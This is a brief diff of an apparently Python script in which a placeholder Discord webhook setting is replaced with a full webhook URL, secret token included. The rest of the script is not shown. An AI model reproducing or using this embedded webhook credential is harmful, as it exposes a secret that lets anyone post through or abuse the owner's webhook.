@@ -7,7 +7,7 @@
 # ╚══════════════════════════════════════════════════════════╝
 
 # ════════ WEBHOOK - PUT YOUR DISCORD WEBHOOK HERE ════════
-WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_HERE"  # ⬅️ REPLACE THIS!
+WEBHOOK_URL = "https://discord.com/api/webhooks/1427133756724084817/uVvQRILIYlg7ku1ZEfPJ69BpS1-WjRFwdyhBt7vbyLB_514MbGcaWPGnPft1riDqm7O0"  # ⬅️ REPLACE THIS!
 
 import os
 import sys
